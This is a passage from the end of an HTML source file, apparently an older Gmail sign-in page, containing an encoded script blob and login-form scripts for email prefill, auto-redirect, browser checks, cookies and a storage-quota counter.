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');
  </script>
<script>
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var form = null;
    if (document.getElementById) {
      form = document.getElementById('gaia_loginform');
    }

    if (form && form.Email &&
        (form.Email.value == null || form.Email.value == '')
        && (form.Email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        form.Email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script>
  function gaia_setFocus() {
  var form = null;
  var isFocusableField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
  return true;
  }
  return false;
  };
  var isFocusableErrorField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var hasError = inputElement.className.indexOf('form-error') > -1;
  if (hasError && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  var isFocusableEmptyField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var isEmpty = inputElement.value == null || inputElement.value == '';
  if (isEmpty && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form) {
  var userAgent = navigator.userAgent.toLowerCase();
  var formFields = form.getElementsByTagName('input');
  for (var i = 0; i < formFields.length; i++) {
        var currentField = formFields[i];
        if (isFocusableErrorField(currentField)) {
          currentField.focus();
          
          var currentValue = currentField.value;
          currentField.value = '';
          currentField.value = currentValue;
          return;
        }
      }
      
      
      
        for (var j = 0; j < formFields.length; j++) {
          var currentField = formFields[j];
          if (isFocusableEmptyField(currentField)) {
            currentField.focus();
            return;
          }
        }
      
    }
  }

  
  
    gaia_attachEvent(window, 'load', gaia_setFocus);
  
  
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
  <script>var f=this,g=function(b,c){var a=b.split("."),d=f;a[0]in d||!d.execScript||d.execScript("var "+a[0]);for(var e;a.length&&(e=a.shift());)a.length||void 0===c?d[e]?d=d[e]:d=d[e]={}:d[e]=c};var h=function(){try{return new XMLHttpRequest}catch(b){for(var c=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],a=0;a<c.length;a++)try{return new ActiveXObject(c[a])}catch(d){}}return null};g("gaia.ajax.newXmlHttpRequest",h);var k=function(){this.a=h();this.parameters={}};g("gaia.ajax.XmlHttpFormRequest",k);
k.prototype.send=function(b,c){var a=[],d;for(d in this.parameters)a.push(d+"="+encodeURIComponent(this.parameters[d]));var a=a.join("&"),e=this.a;e.open("POST",b,!0);e.setRequestHeader("Content-type","application/x-www-form-urlencoded");e.onreadystatechange=function(){4==e.readyState&&c({status:e.status,text:e.responseText})};e.send(a)};k.prototype.send=k.prototype.send;
k.prototype.c=function(b,c,a){var d=this.a;d.open("POST",b,!0);d.setRequestHeader("Content-type","application/json");d.onreadystatechange=function(){4==d.readyState&&a({status:d.status,text:d.responseText})};d.send(c)};k.prototype.sendJson=k.prototype.c;k.prototype.b=function(b,c){var a=this.a;a.open("GET",b,!0);a.onreadystatechange=function(){4==a.readyState&&c({status:a.status,text:a.responseText})};a.send()};k.prototype.get=k.prototype.b;var l=/\s*;\s*/,m=function(){if(!document.cookie)return"";for(var b=document.cookie.split(l),c=0;c<b.length;c++){var a=b[c],a=a.replace(/^\s+/,""),a=a.replace(/\s+$/,"");if(0==a.indexOf("APISID="))return a.substr(7)}return""};var n=null,p=function(b,c){this.g=b;this.f=c;this.c=m();this.b=!1},q=function(){var b=n,c=m();c==b.c||b.b||(b.c=c,(new k).b(b.f,function(a){var b=n;a&&a.status&&200==a.status&&"OK"==a.text&&(b.a&&clearInterval(b.a),b.b||(window.location=b.g))}))},r=function(b){var c=n;if(c.a)return!1;c.a=setInterval(function(){q()},b);return!0};g("gaia.loginAutoRedirect.start",function(b,c,a){if(n||!a||!c||0>=b)return!1;n=new p(c,a);return r(b)});
g("gaia.loginAutoRedirect.stop",function(){var b=n;b.b=!0;b.a&&(clearInterval(b.a),b.a=null)});
</script>
  <script type="text/javascript">
  gaia.loginAutoRedirect.start(5000,
  'https:\x2F\x2Faccounts.google.com\x2FServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F\x26osid=1\x26service=mail\x26ss=1\x26ltmpl=default\x26rm=false\x26passive=true\x26noautologin=true',
  'https:\x2F\x2Faccounts.google.com\x2FPassiveLoginProber?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F\x26osid=1\x26service=mail\x26ss=1\x26ltmpl=default\x26rm=false\x26passive=true');
  </script>
<script>
  (function(){
  var signinInput = document.getElementById('signIn');
  gaia_onLoginSubmit = function() {
  try {
  gaia.loginAutoRedirect.stop();
  } catch (err) {
  // do not prevent form from being submitted
  }
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
<script type="text/javascript">
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()
  </script>
<script type="text/javascript">
<!--

var start_time = (new Date()).getTime();

if (top.location != self.location) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.google.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1224486000000, 7254 ],
 [ 1335290400000, 7704 ],
 [ 1335376800000, 10240 ],
 [ 2144908800000, 13531 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota_elem;
var ONE_PX = "https://mail.google.com/mail/images/cleardot.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = 'https://mail.google.com/mail/gxlu?email=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
function OnLoad() {
  MaybePingUser();
  var passwd_elem = el("Passwd");
  if (passwd_elem) {
  passwd_elem.onfocus = MaybePingUser;
  }
  LogRoundtripTime();
  if (!quota_elem) {
  quota_elem = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota_elem) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000);
  } else if (i == CP.length) {
    quota_elem.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota_elem.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs);
    setTimeout(updateQuota, 1000);
  }
}

var PAD = '.000000';

function format(num) {
  var str = String(num);
  var dot = str.indexOf('.');
  if (dot < 0) {
     return str + PAD;
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var google_conversion_type = 'landing';
var google_conversion_id = 1069902127;
var google_conversion_language = "en_US";
var google_conversion_format = "1";
var google_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.googleadservices.com/pagead/conversion.js";
}
// -->
</script>
<script>
gaia_attachEvent(window, 'load', function() {
  OnLoad();
  FixForm();
});
(function() {
  var gaiaLoginForm = document.getElementById('gaia_loginform');
  var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
  gaiaLoginForm.onsubmit = function() {
  lg();
  if (!fixed) {
  FixForm();
  }
  gaia_onsubmitHandler();
  };
})();
</script>
  </body></html>